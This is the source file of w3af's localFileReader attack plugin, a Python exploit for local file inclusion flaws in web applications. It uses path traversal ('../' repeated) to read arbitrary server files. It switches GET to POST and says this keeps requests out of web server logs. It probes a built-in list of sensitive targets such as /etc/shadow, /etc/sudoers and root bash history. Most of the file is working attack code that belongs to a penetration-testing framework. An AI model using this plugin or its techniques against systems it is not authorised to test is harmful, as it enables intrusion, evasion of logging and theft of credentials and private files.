'''
localFileReader.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''


import core.controllers.outputManager as om
# options
from core.data.options.option import option
from core.data.options.optionList import optionList
from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin

import core.data.kb.knowledgeBase as kb
import core.data.kb.vuln as vuln
from core.data.constants.common_directories import get_common_directories
from core.data.kb.shell import shell as shell

from core.controllers.w3afException import w3afException
import core.data.parsers.urlParser as urlParser
from core.data.fuzzer.fuzzer import createRandAlNum

import re


class localFileReader(baseAttackPlugin):
    '''
    Exploit local file inclusion bugs.
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def __init__(self):
        baseAttackPlugin.__init__(self)
        
        # User configured variables
        self._changeToPost = True
        self._url = ''
        self._method = 'GET'
        self._data = ''
        self._file_pattern = ''
        self._generateOnlyOne = True
        
    def fastExploit( self ):
        '''
        Exploits a web app with local file include vuln.
        '''
        if self._url == ''or self._file_pattern == '' or self._data == '':
            om.out.error('You have to configure the "url" parameter.')
        else:
            v = vuln.vuln()
            v.setURL( self._url )
            v.setMethod( self._method )
            v.setDc( self._data )
            v['file_pattern'] = self._file_pattern
            kb.kb.append( 'localFileInclude', 'localFileInclude', v )
    
    def getAttackType(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''
        return 'shell'
    
    def getVulnName2Exploit( self ):
        '''
        This method should return the vulnerability name (as saved in the kb) to exploit.
        For example, if the audit.osCommanding plugin finds an vuln, and saves it as:
        
        kb.kb.append( 'osCommanding' , 'osCommanding', vuln )
        
        Then the exploit plugin that exploits osCommanding ( attack.osCommandingShell ) should
        return 'osCommanding' in this method.
        '''        
        return 'localFileInclude'
        
    def _generateShell( self, vuln_obj ):
        '''
        @parameter vuln_obj: The vuln to exploit.
        @return: The shell object based on the vulnerability that was passed as a parameter.
        '''
        # Check if we really can execute commands on the remote server
        if self._verifyVuln( vuln_obj ):
            
            if vuln_obj.getMethod() != 'POST' and self._changeToPost and \
            self._verifyVuln( self.GET2POST( vuln_obj ) ):
                msg = 'The vulnerability was found using method GET, but POST is being used during'
                msg += ' this exploit.'
                om.out.information( msg )
                vuln_obj = self.GET2POST( vuln_obj )
            else:
                msg = 'The vulnerability was found using method GET, tried to change the method to'
                msg += ' POST for exploiting but failed.'
                om.out.information( msg )
            
            # Create the shell object
            shell_obj = fileReaderShell( vuln_obj )
            shell_obj.setUrlOpener( self._urlOpener )
            shell_obj.setCut( self._header, self._footer )
            
            return shell_obj
            
        else:
            return None

    def _verifyVuln( self, vuln_obj ):
        '''
        This command verifies a vuln. This is really hard work!

        @return : True if vuln can be exploited.
        '''
        function_reference = getattr( self._urlOpener , vuln_obj.getMethod() )
        try:
            response = function_reference( vuln_obj.getURL(), str(vuln_obj.getDc()) )
        except w3afException, e:
            om.out.error( str(e) )
            return False
        else:
            if self._defineCut( response.getBody(), vuln_obj['file_pattern'], exact=False ):
                return True
            else:
                return False

    def getOptions( self ):
        '''
        @return: A list of option objects for this plugin.
        '''
        d0 = 'f the vulnerability was found in a GET request, try to change the method to POST'
        d0 += ' during exploitation.'
        h0 = 'If the vulnerability was found in a GET request, try to change the method to POST'
        h0 += ' during exploitation; this is usefull for not being logged in the webserver logs.'
        o0 = option('changeToPost', self._changeToPost, d0, 'boolean', help=h0)
        
        d1 = 'URL to exploit with fastExploit()'
        o1 = option('url', self._url, d1, 'string')
        
        d2 = 'Method to use with fastExploit()'
        o2 = option('method', self._method, d2, 'string')

        d3 = 'Data to send with fastExploit()'
        o3 = option('data', self._data, d3, 'string')

        d4 = 'The file pattern to search for while verifiyng the vulnerability.'
        d4 += ' Only used in fastExploit()'
        o4 = option('file_pattern', self._file_pattern, d4, 'string')

        d5 = 'Exploit only one vulnerability.'
        o5 = option('generateOnlyOne', self._generateOnlyOne, d5, 'boolean')
        
        ol = optionList()
        ol.add(o0)
        ol.add(o1)
        ol.add(o2)
        ol.add(o3)
        ol.add(o4)
        ol.add(o5)
        return ol
        
    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptions().
        
        @parameter optionsMap: A dict with the options for the plugin.
        @return: No value is returned.
        ''' 
        self._changeToPost = optionsMap['changeToPost'].getValue()
        self._url = optionsMap['url'].getValue()
        self._method = optionsMap['method'].getValue()
        self._data = urlParser.getQueryString( optionsMap['data'].getValue() )
        self._file_pattern = optionsMap['file_pattern'].getValue()
        self._generateOnlyOne = optionsMap['generateOnlyOne'].getValue()
        
    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''
        return []
    
    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack
        plugin. This is used by the "exploit *" function to order the plugins and first try to
         exploit the more critical ones. This method should return 0 for an exploit that will 
        never return a root shell, and 1 for an exploit that WILL ALWAYS return a root shell.
        '''
        return 0.0
        
    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits local file inclusion and let's you "cat" every file you want. 
        Remember, if the file in being read with an "include()" statement, you wont be able 
        to read the source code of the script file, you will end up reading the result of the
        script interpretation. You can also use the "list" command to list all files inside 
        the known paths.
        
        One configurable parameters exist:
            - changeToPost
        '''

PERMISSION_DENIED = 'Permission denied.'
NO_SUCH_FILE =  'No such file or directory.'
READ_DIRECTORY = 'Cannot cat a directory.'
FAILED_STREAM = 'Failed to open stream.'

class fileReaderShell(shell):
    '''
    A shell object to exploit local file include and local file read vulns.

    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def help( self, command ):
        '''
        Handle the help command.
        '''
        if command == 'help':
            om.out.console('')
            om.out.console('Available commands:')
            om.out.console('    help                            Display this information')
            om.out.console('    cat                             Show the contents of a file')
            om.out.console('    list                            List files that may be interesting.')
            om.out.console('                                    Type "help list" for detailed information.')
            om.out.console('    endInteraction                  Exit the shell session')
            om.out.console('')
        elif command == 'list':
            om.out.console('')
            om.out.console('list help:')
            om.out.console('    The list command generates a list of the files that are available')
            om.out.console('    on the remote server. If you specify the "-r" flag, the list ')
            om.out.console('    process is recursive, this means that if one of the files in the')
            om.out.console('    list references another file, that file is also added to the list')
            om.out.console('    of available files. The "-r" flag expects an integer, which ')
            om.out.console('    indicates the recursion level.')
            om.out.console('')
            om.out.console('Examples:')
            om.out.console('    list -r 10')
            om.out.console('    list')
        elif command == 'cat':
            om.out.console('cat help:')
            om.out.console('    The cat command echoes the content of a file to the console. The')
            om.out.console('    command takes only one parameter: the full path of the file to ')
            om.out.console('    read.')
            om.out.console('')
            om.out.console('Examples:')
            om.out.console('    cat /etc/passwd')
        return True
        
    def _rexec( self, command ):
        '''
        This method is called when a command is being sent to the remote server.
        This is a NON-interactive shell. In this case, the only available command is "cat"

        @parameter command: The command to send ( cat is the only supported command. ).
        @return: The result of the command.
        '''

        # Get the command and the parameters
        cmd = command.split(' ')[0]
        parameters = command.split(' ')[1:]

        # Select the correct handler
        if cmd == 'list':
            return self._list( parameters )
        elif cmd == 'cat' and len(parameters) == 1:
            filename = parameters[0]
            return self._cat( filename )
        else:
            self.help( command )
            return ''
            
    def _cat( self, filename ):
        '''
        Read a file and echo it's content.

        @return: The file content.
        '''
        # TODO: Review this hack
        filename = '../' * 15 + filename

        # Lets send the command.
        function_reference = getattr( self._urlOpener , self.getMethod() )
        data_container = self.getDc()
        data_container[ self.getVar() ] = filename
        try:
            response = function_reference( self.getURL() ,  str(data_container) )
        except w3afException, e:
            return 'Error "' + str(e) + '" while sending command to remote host. Try again.'
        else:
            return self._filter_errors( self._cut( response.getBody() ) )
                
    def _list( self, parameters ):
        '''
        Using some path disclosure problems I can make a good guess
        of the full paths of all files in the webroot, this is the result of
        that guess
        
        @parameter parameters: Indicates if we have to do a recursive list or not.
        '''
        # Parse the parameters
        recursion_level = 0
        if len(parameters) == 2:
            if parameters[0] == '-r' and parameters[1].isdigit():
                recursion_level = int(parameters[1])
            else:
                self.help('list')
                return ''
        
        # Add some files that were generated by the pathDisclosure plugin
        files_to_test = kb.kb.getData( 'pathDisclosure' , 'listFiles' )
        # A lot of common files from a database
        files_to_test.extend( self._get_common_files( self._rOS ) )

        # First, we try with a non existant file, in order to have something to compare with
        rand = createRandAlNum(8)
        non_existant = self._cat( rand )
        non_existant = non_existant.replace( rand, '')
        
        # Define this internal variable that's going to be used in the self._list_recursive_method()
        self._already_tested = []
        
        can_read, permission_denied = self._list_recursive_method( non_existant, files_to_test, recursion_level )
        tmp = can_read
        tmp.extend( permission_denied )
        return '\n'.join(tmp)

    def _list_recursive_method(self, non_existant, files_to_test, recursion_level):
        '''
        This is a method that is called recursively in order to handle the
        "-r" flag of the list command.
        
        @parameter non_existant: A string that represents the response for a non existant file
        @parameter files_to_test: A list with the files to test for existance
        @parameter recursion_level: The recursion level, this number is decremented in each call.
        
        @return: A tuple with two lists, one for the files we can read without any problem, and one
        for the files that exist, but we don't have permission to read. Example:
                (['/etc/passwd'],['/etc/shadow'])
        '''
        can_read = []
        permission_denied = []

        for path_file in files_to_test:
            self._already_tested.append(path_file)
            
            read_result = self._cat( path_file )
            read_result = read_result.replace( path_file, '')
            
            filtered_result = self._filter_errors( read_result )
            
            if filtered_result == PERMISSION_DENIED:
                spaces = 40 - len(path_file)
                permission_denied.append(path_file + ' ' * spaces + PERMISSION_DENIED)
            elif filtered_result not in [NO_SUCH_FILE, READ_DIRECTORY, FAILED_STREAM] and \
            read_result != non_existant:
                # The file exists, add it to the response
                can_read.append(path_file)
                
                # Get the files referenced by this file
                referenced_files = self._get_referenced_files( path_file, filtered_result )
                referenced_files = list( set(referenced_files) - set(self._already_tested) )
                
                # Recursive stuff =)
                if recursion_level and referenced_files:
                    tmp_read, tmp_denied = self._list_recursive_method( non_existant, referenced_files, recursion_level - 1 )
                    can_read.extend( tmp_read )
                    permission_denied.extend( tmp_denied )
                    
                    # uniq
                    can_read = list(set(can_read))
                    permission_denied = list(set(permission_denied))
                    
        can_read.sort()
        permission_denied.sort()
        return can_read, permission_denied

    def _get_referenced_files(self, path_file, file_content):
        '''
        @parameter path_file: The path and filename for the file that we are analyzing
        @parameter file_content: The content of the file that we just read.
        
        @return: A list of files that are referenced from the file.
        '''
        # Compile
        regular_expressions = []
        for common_dirs in get_common_directories():
            regex_string = '('+common_dirs + '.*?)[:| |\0|\'|"|<|\n|\r|\t]'
            regex = re.compile( regex_string,  re.IGNORECASE)
            regular_expressions.append(regex)
        
        # And use
        result = []
        for regex in regular_expressions:
            result.extend( regex.findall( file_content ) )
        
        # uniq
        result = list(set(result))
        
        return result

    def _get_common_files(self, remote_os):
        '''
        @return: A list of common files for the remote_os system.
        '''
        # TODO: maybe this should be on a different file, where all the framework
        # can access it?
        res = []

        if remote_os == 'linux':
            # Common files
            res.append('/etc/passwd')
            res.append('/etc/inetd.conf')
            res.append('/etc/xinetd.conf')
            res.append('/etc/shadow')

            # Different apache configs and scripts
            res.append('/etc/init.d/apache2')
            res.append('/etc/apache2/httpd.conf')
            res.append('/etc/httpd/conf/httpd.conf')
            res.append('/opt/jboss4/server/default/conf/users.properties')

            # Services and stuff
            res.append('/etc/crontab')
            res.append('/etc/sudoers')
            res.append('/etc/bash.bashrc')
            res.append('/etc/fstab')
            res.append('/etc/motd')
            res.append('/etc/environment')
            res.append('/etc/hosts.allow')
            res.append('/etc/hosts.deny')
            res.append('/etc/hosts')

            # bash history files
            res.append('/root/.bash_history')
            res.append('/var/www/.bash_history')
            res.append('/home/www/.bash_history')
            res.append('/home/apache/.bash_history')
            res.append('/home/nobody/.bash_history')
            res.append('/.bash_history')
            res.append('/tmp/.bash_history')

        # TODO: Complete this list with windows stuff
        return res

    def _filter_errors( self, result ):
        '''
        Filter out ugly php errors and print a simple "Permission denied" or "File not found"
        '''
        if result.count('<b>Warning</b>'):
            if result.count( 'Permission denied' ):
                result = PERMISSION_DENIED
            elif result.count( 'No such file or directory in' ):
                result = NO_SUCH_FILE
            elif result.count( 'Not a directory in' ):
                result = READ_DIRECTORY
            elif result.count('</a>]: failed to open stream:'):
                result = FAILED_STREAM
        return result
    
    def end( self ):
        '''
        Cleanup. In this case, do nothing.
        '''
        om.out.debug('fileReaderShell cleanup complete.')
        
    def _identifyOs( self ):
        '''
        Identify the remote operating system and get some remote variables to show to the user.
        '''
        res = self._cat('/etc/passwd')
        if 'root:' in res:
            self._rOS = 'linux'
        else:
            self._rOS = 'windows'

        # This can't be determined
        self._rSystem = ''
        self._rSystemName = 'linux'
        self._rUser = 'file-reader'
    
    def __repr__( self ):
        '''
        @return: A string representation of this shell.
        '''
        if not self._rOS:
            self._identifyOs()

        return '<shell object (rsystem: "'+self._rOS+'")>'
        
    __str__ = __repr__
    
    def getName( self ):
        '''
        @return: The name of this shell.
        '''
        return 'localFileReader'
        
